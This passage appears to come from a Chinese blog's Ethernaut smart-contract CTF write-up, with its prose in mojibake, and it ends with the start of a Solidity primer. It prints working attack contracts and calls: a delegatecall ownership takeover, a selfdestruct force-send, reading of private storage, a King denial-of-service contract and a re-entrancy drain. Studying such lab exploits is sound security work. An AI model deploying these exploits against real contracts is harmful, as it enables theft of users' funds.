MIT\npragma solidity ^0.6.0;\n\ncontract Delegate {\n\n  address public owner;\n\n  constructor(address _owner) public {\n    owner = _owner;\n  }\n\n  function pwn() public {\n    owner = msg.sender;\n  }\n}\n\ncontract Delegation {\n\n  address public owner;\n  Delegate delegate;\n\n  constructor(address _delegateAddress) public {\n    delegate = Delegate(_delegateAddress);\n    owner = msg.sender;\n  }\n\n  fallback() external {\n    (bool result,) = address(delegate).delegatecall(msg.data);\n    if (result) {\n      this;\n    }\n  }\n}\n```\n\nå¾ˆæ˜æ˜¾éœ€è¦é€šè¿‡è°ƒç”¨pwnå‡½æ•°æ¥å°†ownerå˜æˆæˆ‘ä»¬è‡ªå·±ï¼Œä½†æ˜¯éƒ¨ç½²çš„åˆçº¦æ˜¯`Delegation`ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦ä¸­çš„å‡½æ•°å‘¢ï¼Œå¾ˆç®€å•ï¼Œä½¿ç”¨solidityä¸­è‡ªå¸¦çš„callæ–¹æ³•å³å¯\n\nåœ¨solidityä¸­æœ‰ä¸‰ç§callæ–¹æ³•å¯ç”¨ï¼š\n\n- **call**\n\n  ```\n  <address>.call(bytes memory) returns (bool, bytes memory)\n  ```\n\n  ä½¿ç”¨ç»™å®šçš„payloadå‘å‡ºä¸€ä¸ªä½çº§(low-level)çš„`CALL`å‘½ä»¤ï¼Œè¿”å›æ‰§è¡Œæ˜¯å¦æˆåŠŸå’Œæ•°æ®ï¼Œè½¬å‘æ‰€æœ‰å¯ç”¨gasï¼Œå¯è°ƒæ•´ã€‚\n\n- **delegatecall**\n\n  ```\n  <address>.delegatecall(bytes memory) returns (bool, bytes memory)\n  ```\n\n  ä½¿ç”¨ç»™å®špayloadå‘å‡ºä¸€ä¸ªä½çº§çš„`DELEGATECALL`æŒ‡ä»¤ï¼Œè¿”å›æ‰§è¡Œæ˜¯å¦æˆåŠŸå’Œæ•°æ®ï¼Œè½¬å‘æ‰€æœ‰å¯ç”¨gasï¼Œå¯è°ƒæ•´ã€‚\n\n- **staticcall**\n\n  ```\n  <address>.staticcall(bytes memory) returns (bool, bytes memory)\n  ```\n\n  ä½¿ç”¨ç»™å®špayloadå‘å‡ºä¸€ä¸ªä½çº§çš„`STATICCALL`æŒ‡ä»¤ï¼Œè¿”å›æ‰§è¡Œæ˜¯å¦æˆåŠŸå’Œæ•°æ®ï¼Œè½¬å‘æ‰€æœ‰å¯ç”¨gasï¼Œå¯è°ƒæ•´ã€‚\n\n- ~~è¿™å®˜æ–¹æ–‡æ¡£çº¯çº¯åºŸè¯ï¼Œè¯´äº†è·Ÿæ²¡è¯´ä¸€æ ·~~\n\nä¹ä¸€çœ‹ä¼¼ä¹å†…å®¹éƒ½å·®ä¸å¤šï¼Œé‚£æˆ‘ä»¬è‡ªå·±è°ƒç”¨è¿™äº›å‘½ä»¤æ¥æµ‹è¯•ä¸€ä¸‹å§\n\n```solidity\npragma solidity ^0.4.23;\ncontract Calltest {\n    address public b;\n\n    function test() public {\n        b=address(this);\n    }\n}\ncontract Compare {\n    address public b;\n    address public testaddress;\n\n    event logb(address _a);\n\n    constructor(address _addressOfCalltest) public {\n        testaddress = _addressOfCalltest;\n    }\n    function withcall() public {//é€šè¿‡callæ–¹æ³•è°ƒç”¨å‡½æ•°\n        testaddress.call(bytes4(keccak256(\"test()\")));\n        emit logb(b);\n    }\n    function withdelegatecall() public {//é€šè¿‡delegatecallæ–¹æ³•è°ƒç”¨å‡½æ•°\n        testaddress.delegatecall(bytes4(keccak256(\"test()\")));\n        emit logb(b);\n    }\n}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208222013360.png)\n\nå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä½¿ç”¨callæ–¹æ³•è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¯ä»¥å‘ç°`CALLTEST`åˆçº¦çš„bå·²ç»å˜æˆäº†è¿™ä¸ªåˆçº¦çš„éƒ¨ç½²åœ°å€` 0xDA0bab807633f07f013f94DD0E6A4F96F8742B53`ï¼Œè€ŒCompareåˆçº¦çš„åœ°å€å¹¶æ²¡æœ‰å˜åŒ–ã€‚è¯´æ˜`call`åªæ˜¯åœ¨`Calltest`åˆçº¦ä¸­æ‰§è¡Œäº†testå‡½æ•°\n\nè€Œåœ¨ä½¿ç”¨delegatecallæ–¹æ³•è°ƒç”¨å‡½æ•°æ—¶ï¼Œ`COMPARE`åˆçº¦çš„bå˜æˆäº†åˆçº¦éƒ¨ç½²åœ°å€ï¼Œè¯´æ˜è¿™ä¸ªå‡½æ•°å®é™…ä¸Šæ˜¯åœ¨`Compare`åˆçº¦ä¸­æ‰§è¡Œçš„ï¼Œä¹Ÿå°±ç›¸å½“äºæ˜¯æŠŠå‡½æ•°å¤åˆ¶äº†ä¸€ä»½åˆ°åˆçº¦ä¸­æ‰§è¡Œ\n\né‚£ä¹ˆåœ¨è¿™ä¸ªåˆçº¦ä¸­æˆ‘ä»¬åªéœ€è¦é€šè¿‡fallbackæ‰§è¡Œdelegatecallæ¥è¿›å…¥Delegateåˆçº¦ä¸­çš„pwnæ–¹æ³•æ¥æ‰§è¡Œæ›¿æ¢owner\n\nè€Œfallbackå‡½æ•°çš„æ‰§è¡Œåªéœ€è¦sendTransactionæ–¹æ³•ï¼Œå¸¦ä¸Šdataå³å¯æ‰§è¡Œpwnå‡½æ•°ï¼Œæ–¹æ³•çš„IDæ˜¯4å­—èŠ‚çš„sha3\n\n```\ncontract.sendTransaction({data:web3.utils.sha3(\"pwn()\").slice(0,10)})\n```\n\n> ä½¿ç”¨`delegatecall` æ˜¯å¾ˆå±é™©çš„, è€Œä¸”å†å²ä¸Šå·²ç»å¤šæ¬¡è¢«ç”¨äºè¿›è¡Œ attack vector. ä½¿ç”¨å®ƒ, ä½ å¯¹åˆçº¦ç›¸å½“äºåœ¨è¯´ \"çœ‹è¿™é‡Œ, -å…¶ä»–åˆçº¦- æˆ–æ˜¯ -å…¶å®ƒåº“-, æ¥å¯¹æˆ‘çš„çŠ¶æ€ä¸ºæ‰€æ¬²ä¸ºå§\". ä»£ç†å¯¹ä½ åˆçº¦çš„çŠ¶æ€æœ‰å®Œå…¨çš„æ§åˆ¶æƒ. `delegatecall` å‡½æ•°æ˜¯ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„åŠŸèƒ½, ä½†æ˜¯ä¹Ÿå¾ˆå±é™©, æ‰€ä»¥ä½¿ç”¨çš„æ—¶å€™éœ€è¦éå¸¸å°å¿ƒ.\n>\n> è¯·å‚è§ [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) è¿™ç¯‡æ–‡ç« , ä»–è¯¦ç»†è§£é‡Šäº†è¿™ä¸ªæ–¹æ³•æ˜¯å¦‚ä½•çªƒå–ä¸‰åƒä¸‡ç¾å…ƒçš„.\n\n## Force\n\n> æœ‰äº›åˆçº¦å°±æ˜¯æ‹’ç»ä½ çš„ä»˜æ¬¾,å°±æ˜¯è¿™ä¹ˆä»»æ€§ `Â¯\\_(ãƒ„)_/Â¯`\n>\n> è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ä½¿åˆçº¦çš„ä½™é¢å¤§äº0\n>\n>  è¿™å¯èƒ½æœ‰å¸®åŠ©:\n>\n> - Fallback æ–¹æ³•\n> - æœ‰æ—¶å€™æ”»å‡»ä¸€ä¸ªåˆçº¦æœ€å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨å¦ä¸€ä¸ªåˆçº¦.\n> - é˜…è¯»ä¸Šæ–¹çš„å¸®åŠ©é¡µé¢, \"æ§åˆ¶å°ä¹‹å¤–\" éƒ¨åˆ†\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Force {/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =Ã¸= /\n (______)__m_m)\n\n*/}\n```\n\næƒ³è®©åˆçº¦ä½™é¢å¤§äº0é¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯ç›´æ¥è½¬è´¦äº†`contract.sendTransaction(instance,1)`ï¼Œä½†æ˜¯ç”±äºfallbacké‡å†™å¯¼è‡´æˆ‘ä»¬çš„äº¤æ˜“è¢«å›é€€ï¼Œå¦‚å›¾æ‰€ç¤º\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208222059265.png)\n\næ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªåˆçº¦äº†ï¼Œåœ¨`selfdestruct`å‡½æ•°ä¸­ä¼šå°†æ•´ä¸ªåˆçº¦é”€æ¯å¹¶å°†åˆçº¦ä½™é¢å¼ºåˆ¶ç»™äºˆæŒ‡å®šåœ°å€å¹¶ä¸”å¿½ç•¥fallbackå‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªéœ€è¦åœ¨åˆ¶ä½œä¸€ä¸ªæ–°åˆçº¦ï¼Œå­˜å…¥ä»£å¸ï¼Œé”€æ¯å‘é€åˆ°é¢˜ç›®åˆçº¦å³å¯\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\ncontract Test{\n  address aim;\n  constructor (address t){\n    aim=t;\n  }\n  function a() payable{\n    \n  }\n  function sd(){\n    selfdestruct(aim);\n  }\n}\n```\n\n> åœ¨solidityä¸­, å¦‚æœä¸€ä¸ªåˆçº¦è¦æ¥å— ether, fallback æ–¹æ³•å¿…é¡»è®¾ç½®ä¸º `payable`.\n>\n> ä½†æ˜¯, å¹¶æ²¡æœ‰å‘ä»€ä¹ˆåŠæ³•å¯ä»¥é˜»æ­¢æ”»å‡»è€…é€šè¿‡è‡ªæ¯çš„æ–¹æ³•å‘åˆçº¦å‘é€ ether, æ‰€ä»¥, ä¸è¦å°†ä»»ä½•åˆçº¦é€»è¾‘åŸºäº `address(this).balance == 0` ä¹‹ä¸Š.\n\n## Vault\n\n> æ‰“å¼€ vault æ¥é€šè¿‡è¿™ä¸€å…³!\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Vault {\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) public {\n    locked = true;\n    password = _password;\n  }\n\n  function unlock(bytes32 _password) public {\n    if (password == _password) {\n      locked = false;\n    }\n  }\n}\n```\n\næ˜æ˜¾è¦æ‹¿passwordï¼Œä½†æ˜¯privateæ€ä¹ˆæ‹¿å‘¢ï¼Ÿ\n\n> è¿™æ¶‰åŠåˆ°ä¸€ç‚¹ï¼šä»¥å¤ªåŠéƒ¨ç½²å’Œåˆçº¦ä¸Šæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯å¯è¯»çš„ï¼ŒåŒ…æ‹¬è¿™é‡Œåˆçº¦å†…å®šä¹‰ä¸ºprivateç±»å‹çš„passwordå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`web3.eth.getStorageAt`æ¥è¯»å–åˆçº¦è¡Œå¯¹åº”åœ°å€çš„æ•°æ®\n>\n> ```\n> web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])\n> ```\n>\n> ç¬¬ä¸€ä¸ªå‚æ•°æ—¶å¯¹åº”è¦è¯»å–çš„åˆçº¦åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦è¯»å–å†…å®¹çš„ç´¢å¼•ä½ç½®(å˜é‡æ˜¯ç¬¬å‡ ä¸ªè¢«å®šä¹‰çš„å˜é‡)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å¦‚æœè¢«è®¾ç½®ï¼Œé‚£ä¹ˆå°±ä¸ä¼šä½¿ç”¨é»˜è®¤çš„block(è¢«[web3.eth.defaultBlock](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#eth-defaultblock)è®¾ç½®çš„é»˜è®¤å—)ï¼Œè€Œæ˜¯ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„å—ï¼Œè¿™ä¸ªå‚æ•°å¯é€‰é¡¹æœ‰`\"earliest\"`, `\"latest\"` å’Œ `\"pending\"`ï¼Œç¬¬å››ä¸ªé€‰é¡¹è®¾ç½®å›è°ƒå‡½æ•°ã€‚\n\næ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¯»å°±å¥½å•¦ï¼Œpasswordç¬¬äºŒä¸ªè¢«å®šä¹‰ï¼Œæˆ‘ä»¬ç›´æ¥è¯»1\n\n```\nawait web3.eth.getStorageAt(contract.address,1)\n```\n\nç„¶åç”¨passwordè§£é”å°±å¥½å•¦ï½\n\n> è¯·è®°ä½, å°†ä¸€ä¸ªå˜é‡è®¾åˆ¶æˆç§æœ‰, åªèƒ½ä¿è¯ä¸è®©åˆ«çš„åˆçº¦è®¿é—®ä»–. è®¾åˆ¶æˆç§æœ‰çš„çŠ¶æ€å˜é‡å’Œæœ¬åœ°å˜é‡, ä¾æ—§å¯ä»¥è¢«å…¬å¼€è®¿é—®.\n>\n> ä¸ºäº†ç¡®ä¿æ•°æ®ç§æœ‰, éœ€è¦åœ¨ä¸Šé“¾å‰åŠ å¯†. åœ¨è¿™ç§æƒ…å†µä¸‹, å¯†é’¥ç»å¯¹ä¸è¦å…¬å¼€, å¦åˆ™ä¼šè¢«ä»»ä½•æƒ³çŸ¥é“çš„äººè·å¾—. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) æä¾›äº†ä¸€ä¸ªå¯ä»¥åˆ¤æ–­æŸä¸ªäººæ˜¯å¦æœ‰æŸä¸ªç§˜å¯†å‚æ•°çš„æ–¹æ³•,ä½†æ˜¯ä¸å¿…é€éœ²è¿™ä¸ªå‚æ•°.\n\n## King\n\n> ä¸‹é¢çš„åˆçº¦è¡¨ç¤ºäº†ä¸€ä¸ªå¾ˆç®€å•çš„æ¸¸æˆ: ä»»ä½•ä¸€ä¸ªå‘é€äº†é«˜äºç›®å‰ä»·æ ¼çš„äººå°†æˆä¸ºæ–°çš„å›½ç‹. åœ¨è¿™ä¸ªæƒ…å†µä¸‹, ä¸Šä¸€ä¸ªå›½ç‹å°†ä¼šè·å¾—æ–°çš„å‡ºä»·, è¿™æ ·å¯ä»¥èµšå¾—ä¸€äº›ä»¥å¤ªå¸. çœ‹èµ·æ¥åƒæ˜¯åºæ°éª—å±€.\n>\n> è¿™ä¹ˆæœ‰è¶£çš„æ¸¸æˆ, ä½ çš„ç›®æ ‡æ˜¯æ”»ç ´ä»–.\n>\n> å½“ä½ æäº¤å®ä¾‹ç»™å…³å¡æ—¶, å…³å¡ä¼šé‡æ–°ç”³æ˜ç‹ä½. ä½ éœ€è¦é˜»æ­¢ä»–é‡è·ç‹ä½æ¥é€šè¿‡è¿™ä¸€å…³.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract King {\n\n  address payable king;\n  uint public prize;\n  address payable public owner;\n\n  constructor() public payable {\n    owner = msg.sender;  \n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  receive() external payable {\n    require(msg.value >= prize || msg.sender == owner);\n    king.transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  function _king() public view returns (address payable) {\n    return king;\n  }\n}\n```\n\nç›´æ¥çœ‹receiveï¼Œæˆ‘ä»¬éœ€è¦å‡ºä»·æ¯”åŸæ¥çš„kingé«˜æ‰èƒ½æ‹¿åˆ°æ§åˆ¶æƒï¼Œå¹¶ä¸”é¢˜ç›®ä¸­è¯´äº†åœ¨æäº¤å®ä¾‹æ˜¯å…³å¡ä¼šé‡æ–°å°è¯•å¤ºå›ç‹æƒï¼Œä¹Ÿå°±æ˜¯å†ç»™æˆ‘ä»¬ä¸€ä¸ªæ›´å¤§æ•°é¢çš„ethï¼Œæˆ‘ä»¬æ€ä¹ˆæ‰èƒ½é˜²æ­¢ä»–é€šè¿‡æ›´é«˜å‡ºä»·æ¥å¤ºèµ°ç‹ä½å‘¢ï¼Ÿ\n\næˆ‘ä»¬åªéœ€è¦åœ¨å¦èµ·ä¸€ä¸ªåˆçº¦ï¼Œåœ¨åˆçº¦ä¸­è®¾ç½®receiveå†…å®¹ä¸ºrevertå‡½æ•°ï¼Œè¿™æ ·åœ¨æˆ‘ä»¬çš„åˆçº¦æ”¶åˆ°ä»£å¸çš„æ—¶å€™å°±ä¼šè§¦å‘å›æ»šå¯¼è‡´kingé‡å¤ºç‹ä½å¤±è´¥\n\n```solidity\npragma solidity ^0.6.0;\ncontract AttackKing {\n    constructor(address payable _victim) public payable {\n        _victim.call.gas(1000000).value(0.01 ether)(\"\");\n    }\n    receive() external payable {\n        revert();\n    }\n}\n```\n\n> å¤§å¤šæ•° Ethernaut çš„å…³å¡å°è¯•å±•ç¤ºçœŸå®å‘ç”Ÿçš„ bug å’Œ hack (ä»¥ç®€åŒ–è¿‡çš„æ–¹å¼).\n>\n> å…³äºè¿™æ¬¡çš„æƒ…å†µ, å‚è§: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) å’Œ [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html)\n\n\n\n\n\n# Re-entrancy\n\nç»å…¸çš„é‡å…¥æ¼æ´ç»ˆäºæ¥å–½\n\n> è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯å·èµ°åˆçº¦çš„æ‰€æœ‰èµ„äº§.\n>\n>  è¿™äº›å¯èƒ½æœ‰å¸®åŠ©:\n>\n> - ä¸å¯ä¿¡çš„åˆçº¦å¯ä»¥åœ¨ä½ æ„æ–™ä¹‹å¤–çš„åœ°æ–¹æ‰§è¡Œä»£ç .\n> - Fallback methods\n> - æŠ›å‡º/æ¢å¤ bubbling\n> - æœ‰çš„æ—¶å€™æ”»å‡»ä¸€ä¸ªåˆçº¦çš„æœ€å¥½æ–¹å¼æ˜¯ä½¿ç”¨å¦ä¸€ä¸ªåˆçº¦.\n> - æŸ¥çœ‹ä¸Šæ–¹å¸®åŠ©é¡µé¢, \"æ§åˆ¶å°ä¹‹å¤–\" éƒ¨åˆ†\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Reentrance {\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  receive() external payable {}\n}\n```\n\n> æ³¨æ„è¿™é‡Œä½¿ç”¨äº†`call{value:xx}`çš„å½¢å¼ï¼Œ`call`æ˜¯`send`å’Œ`transfer`å‡½æ•°åº•å±‚å®ç°ï¼Œä¹Ÿæ˜¯ç”¨æ¥è½¬è´¦çš„ã€‚ä¸å®ƒä»¬çš„åŒºåˆ«åœ¨äºï¼Œ[å‚è€ƒé“¾æ¥](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/)\n>\n> - transfer:è¦æ±‚æ¥æ”¶çš„æ™ºèƒ½åˆçº¦ä¸­å¿…é¡»æœ‰ä¸€ä¸ª`fallback`æˆ–è€…`receive`å‡½æ•°ï¼Œå¦åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯(error)ï¼Œå¹¶ä¸”revertï¼ˆä¹Ÿå°±æ˜¯å›æ»šåˆ°äº¤æ˜“å‰çš„çŠ¶æ€ï¼‰ã€‚è€Œä¸”æœ‰å•ç¬”äº¤æ˜“ä¸­çš„æ“ä½œæ€»gasä¸èƒ½è¶…è¿‡2300çš„é™åˆ¶ã€‚transferå‡½æ•°ä¼šåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µæŠ›å‡ºé”™è¯¯ï¼š\n>   - ä»˜æ¬¾æ–¹åˆçº¦çš„ä½™é¢ä¸è¶³ï¼Œå°äºæ‰€è¦å‘é€çš„value\n>   - æ¥æ”¶æ–¹åˆçº¦æ‹’ç»æ¥æ”¶æ”¯ä»˜\n> - send:å’Œtransferå‡½æ•°çš„å·¥ä½œæ–¹å¼åŸºæœ¬ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºï¼Œå½“å‡ºç°ä¸Šè¿°ä¸¤ç§äº¤æ˜“å¤±è´¥çš„æƒ…å†µæ—¶ï¼Œsendçš„è¿”å›ç»“æœæ˜¯ä¸€ä¸ªbooleanå€¼ï¼Œè€Œä¸ä¼šæ‰§è¡Œrevertå›æ»šã€‚\n> - call: callå‡½æ•°å’Œä¸Šé¢æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼Œå®ƒæ²¡æœ‰gasçš„é™åˆ¶ï¼Œä½¿ç”¨callæ—¶EVMå°†æ‰€æœ‰gasè½¬ç§»åˆ°æ¥æ”¶åˆçº¦ä¸Šï¼Œå½¢å¼å¦‚ä¸‹:\n\nå®¡è®¡åˆçº¦ä»£ç ï¼Œè¿™ä¸ªåˆçº¦çš„ä½œç”¨ç±»ä¼¼äºé“¶è¡Œï¼Œdonateå­˜withdrawå–ï¼Œé‚£ä¹ˆè¿™ä¸ªä»£ç é—®é¢˜ç©¶ç«Ÿå‡ºåœ¨å“ªé‡Œå‘¢ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹å­˜æ¬¾å‡½æ•°ï¼Œé¦–å…ˆåˆ¤æ–­æˆ‘ä»¬çš„è´¦æˆ·æ˜¯å¦æœ‰è¶³å¤Ÿä½™é¢ï¼Œç„¶åç»™æˆ‘ä»¬çš„è´¦æˆ·è½¬å¸ï¼Œæœ€åæ‰£é™¤ä½™é¢ï¼Œçœ‹èµ·æ¥éƒ½æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœé“¶è¡Œçš„å­˜æ¬¾è´¦æˆ·å¹¶ä¸æ˜¯ä¸€ä¸ªé’±åŒ…è€Œæ˜¯ä¸€ä¸ªåˆçº¦å‘¢ï¼Ÿ\n\nè¿™æ—¶ä¼šç›´æ¥è¿›å…¥åˆ°è¿™ä¸ªåˆçº¦çš„fallbackæˆ–è€…receiveå‡½æ•°ä¸­ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç‰¹æ®Šçš„åˆçº¦ï¼Œè®©æ¥æ”¶å‡½æ•°çš„fallbackå‡½æ•°é‡å¤è°ƒç”¨ç›®æ ‡åˆçº¦çš„`withdraw`å‡½æ•°ï¼Œè¿™æ ·åˆçº¦å°±ä¼šä¸æ–­ç»™æˆ‘ä»¬æ‰€ç¼–å†™çš„åˆçº¦è½¬è´¦ç›´è‡³ä½™é¢ä¸º0ã€‚å…·ä½“ä»£ç å¦‚ä¸‹\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract attack {\n\n    address payable target;\n    address payable public owner;\n    uint amount = 100000000000000 wei;\n\n    constructor(address payable _addr) public payable {\n        target=_addr;\n        owner = msg.sender;\n    }\n\n    function step1() public payable{\n        bool b;\n        (b,)=target.call{value: amount}(abi.encodeWithSignature(\"donate(address)\",address(this)));\n        require(b,\"step1 error\");\n    }\n\n    function setp2() public payable {\n        bool b;\n        (b,)=target.call(abi.encodeWithSignature(\"withdraw(uint256)\",amount));\n        require(b,\"step2 error\");\n    }\n\n\n    fallback () external payable{\n        bool b;\n        (b,)=target.call(abi.encodeWithSignature(\"withdraw(uint256)\",amount));\n        require(b,\"fallback error\");\n    }\n\n    function mywithdraw() external payable{\n        require(msg.sender==owner,'not you');\n        msg.sender.transfer(address(this).balance);\n    }\n}\n```\n\n1000000000000000\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"æ™ºèƒ½åˆçº¦å…¥é—¨","url":"/posts/ad0a0e46.html","content":"\nåŒºå—é“¾æˆ‘æ¥å•¦\n\n<!--more -->\n\n# æ™ºèƒ½åˆçº¦å…¥é—¨\n\n## Solidity\n\n> Solidityä¸­æ™ºèƒ½åˆçº¦çš„å«ä¹‰å°±æ˜¯ä¸€ç»„ä»£ç ï¼ˆå®ƒçš„ *åŠŸèƒ½* )å’Œæ•°æ®ï¼ˆå®ƒçš„ *çŠ¶æ€* ï¼‰çš„é›†åˆï¼Œå¹¶ä¸”å®ƒä»¬æ˜¯ä½äºä»¥å¤ªåŠåŒºå—é“¾çš„ä¸€ä¸ªç‰¹å®šåœ°å€ä¸Šçš„ã€‚\n\nSolidityä¹Ÿæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œä¸è¿‡å®ƒé’ˆå¯¹æ™ºèƒ½åˆçº¦é¡¹ç›®è¿›è¡Œäº†å…¨é¢çš„æ”¯æŒï¼Œè¦æƒ³äº†è§£ä¸€é—¨è¯­è¨€å½“ç„¶è¦ä»ç¼–å†™ç¨‹åºå¼€å§‹å’¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ¥å†™æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªSolidityåˆçº¦å§\n\n```solidity\n//Name.sol\npragma solidity ^0.4.16;//Solidityå¿…é¡»å¼€å¤´ï¼Œç”Ÿå‘½åˆçº¦ç‰ˆæœ¬\ncontract Name{\n    string name=\"Jlan\";//è®¾å®šçŠ¶æ€\n    function getName() public returns(string)//è®¾å®šåŠŸèƒ½\n    {\n        return name;\n    }\n    function changeName(string _newName) public\n    {\n        name=_newName;\n    }\n}\n```\n\nä»¥ä¸Šå°±æ˜¯ä¸€ä¸ªéå¸¸åŸºç¡€çš„Solidityåˆçº¦äº†ï¼Œå¯ä»¥çœ‹çš„å‡ºåˆçº¦å¾ˆåƒæ˜¯æˆ‘ä»¬åœ¨åˆ«çš„è¯­è¨€ä¸­çš„ä¸€ä¸ªç±»ï¼Œç¡®å®å¦‚æ­¤ï¼Œæ‰€ä»¥ä¸€äº›é¢å‘å¯¹è±¡ç¼–ç¨‹çš„å†…å®¹ä¹Ÿå¯ä»¥å¥—ç”¨åˆ°Solidityä¸Š\n\nåœ¨Solidityä¸­ï¼Œè®¸å¤šçš„æ“ä½œéƒ½éœ€è¦èŠ±è´¹èµ„æºï¼Œåˆågasï¼Œä¹Ÿå°±æ˜¯è™šæ‹Ÿè´§å¸ï¼Œè¿™äº›å†…å®¹å°†åœ¨åé¢è®²åˆ°\n\nåœ¨ç»™å±æ€§å¢åŠ publicå±æ€§ä¹‹åè‡ªåŠ¨ç”Ÿæˆgetæ–¹æ³•\n\n### æ•°æ®ç±»å‹\n\n- int\n- uint=ä¸€ä¸ª256ä½é•¿åº¦çš„æ— ç¬¦å·int\n- bytes1......bytes32 ä¸€ä¸ªbyteç±»å‹æ˜¯8ä½\n\n### å…³é”®å­—\n\n- public\n- view\n- pure\n- returns\n- return\n- payableå…³é”®å­—ä¿®é¥°å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°ç»™æˆ‘ä»¬çš„åˆçº¦åœ°å€å……å€¼\n\nå›æ»šå‡½æ•°ï¼ˆfallbackï¼‰\n\n### å…¨å±€å±æ€§\n\n- `block.blockhash(uint blockNumber) returns (bytes32)`ï¼šæŒ‡å®šåŒºå—çš„åŒºå—å“ˆå¸Œâ€”â€”ä»…å¯ç”¨äºæœ€æ–°çš„ 256 ä¸ªåŒºå—ä¸”ä¸åŒ…æ‹¬å½“å‰åŒºå—ï¼›è€Œ blocks ä» 0.4.22 ç‰ˆæœ¬å¼€å§‹å·²ç»ä¸æ¨èä½¿ç”¨ï¼Œç”± `blockhash(uint blockNumber)` ä»£æ›¿\n- `block.coinbase` (`address`): æŒ–å‡ºå½“å‰åŒºå—çš„çŸ¿å·¥åœ°å€\n- `block.difficulty` (`uint`): å½“å‰åŒºå—éš¾åº¦\n- `block.gaslimit` (`uint`): å½“å‰åŒºå— gas é™é¢\n- `block.number` (`uint`): å½“å‰åŒºå—å·\n- `block.timestamp` (`uint`): è‡ª unix epoch èµ·å§‹å½“å‰åŒºå—ä»¥ç§’è®¡çš„æ—¶é—´æˆ³\n- `gasleft() returns (uint256)`ï¼šå‰©ä½™çš„ gas\n- `msg.data` (`bytes`): å®Œæ•´çš„ calldata\n- `msg.gas` (`uint`): å‰©ä½™ gas - è‡ª 0.4.21 ç‰ˆæœ¬å¼€å§‹å·²ç»ä¸æ¨èä½¿ç”¨ï¼Œç”± `gesleft()` ä»£æ›¿\n- `msg.sender` (`address`): æ¶ˆæ¯å‘é€è€…ï¼ˆå½“å‰è°ƒç”¨ï¼‰\n- `msg.sig` (`bytes4`): calldata çš„å‰ 4 å­—èŠ‚ï¼ˆä¹Ÿå°±æ˜¯å‡½æ•°æ ‡è¯†ç¬¦ï¼‰\n- `msg.value` (`uint`): éšæ¶ˆæ¯å‘é€çš„ wei çš„æ•°é‡\n- `now` (`uint`): ç›®å‰åŒºå—æ—¶é—´æˆ³ï¼ˆ`block.timestamp`ï¼‰\n- `tx.gasprice` (`uint`): äº¤æ˜“çš„ gas ä»·æ ¼\n- `tx.origin` (`address`): äº¤æ˜“å‘èµ·è€…ï¼ˆå®Œå…¨çš„è°ƒç”¨é“¾ï¼‰\n\n### addressæˆå‘˜å˜é‡\n\n- `<address>.balance` (`uint256`):\n\n  ä»¥ Wei 